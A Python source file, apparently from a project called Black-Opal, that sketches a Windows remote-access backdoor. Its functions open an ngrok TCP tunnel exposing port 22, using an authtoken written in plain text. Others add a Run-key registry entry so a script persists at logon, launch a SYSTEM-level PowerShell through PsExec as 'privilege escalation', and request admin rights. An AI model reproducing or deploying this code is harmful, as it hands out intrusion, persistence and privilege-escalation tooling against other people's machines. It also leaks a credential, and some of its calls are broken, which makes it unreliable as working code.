import os
import sys
import time
import winreg
import pyautogui
import subprocess
from multiprocessing import Process
from pyuac import main_requires_admin #add pyuac and pypiwin32 to requirements.txt


def start_server():
    subprocess.Popen(['cmd.exe', '/c', 'cd C:/Users/cyn0v/OneDrive/Documents/GitHub/Black-Opal/Resources && ngrok.exe config add-authtoken 2NcGv9L4xjrCQbpSTgOHtknpsuT_71J81Uz2vQzmbLZpydbfD && ngrok.exe tcp 22'])
    time.sleep(5)
    
def save_to_reg():
    import winreg

    # set the path to the Python executable and script
    python_path = "C:\\Python\\python.exe"
    script_path = "C:\\path\\to\\script.py"

    # open the "Run" key in the registry
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        access=winreg.KEY_SET_VALUE)

    # add a new string value with the path to the Python script
    winreg.SetValueEx(key, "MyScript", 0, winreg.REG_SZ, f'"{python_path}" "{script_path}"')
    
    # close the registry key
    winreg.CloseKey(key)
    
def priv_escaltion():
    #run exe file from path
    os.system("SysinternalsSuite\PsExec.exe -s powershell.exe")
    
#def commands():
#    time.sleep(2)
#    pyautogui.write("sc.exe sdshow scmanager")
#    pyautogui.press("enter")
#    pyautogui.write("sc.exe sdshow scmanager")
#    pyautogui.press("enter")
#    pass
   
def send_message(port, message):
    #send message
    os.system(f"powershell -c \"$c = New-Object System.Net.Sockets.TCPClient('127.0.0.1', {port});$c.Connect();$c.Send('{message}');$c.Disconnect()\"")
    


@main_requires_admin
def main():
    default_path = os.getcwd()
    #p1 = Process(target = priv_escaltion)
    #p1.start()
    p2 = Process(target = start_server)
    p2.start()

if __name__ == "__main__":
    main()